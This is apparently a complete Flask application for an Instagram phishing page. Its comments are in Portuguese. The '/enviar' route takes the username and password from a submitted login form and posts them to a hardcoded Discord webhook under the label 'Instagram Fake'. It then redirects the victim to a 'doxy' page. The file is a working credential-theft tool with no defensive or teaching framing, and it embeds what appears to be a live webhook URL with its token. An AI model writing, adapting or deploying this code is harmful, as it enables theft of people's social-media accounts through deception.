from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1371681681484025876/yxCVK0-va8tMECAHrLKQqXQWzDnNRc56Qk1McwMnqHbwB3EVw3iuXEW7c7gIdqrwfmzu'  # Use sua URL real aqui

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    usuario = request.form.get('username')
    senha = request.form.get('password')

    data = {
        "content": f"Instagram Fake - username: {usuario} | password: {senha}"
    }

    response = requests.post(WEBHOOK_URL, json=data)

    if response.status_code in [200, 204]:
        return redirect('/doxy')
    else:
        return f'Erro: {response.status_code}'

@app.route('/doxy')
def doxy():
    return render_template('doxy.html')

if __name__ == '__main__':
    app.run(debug=True)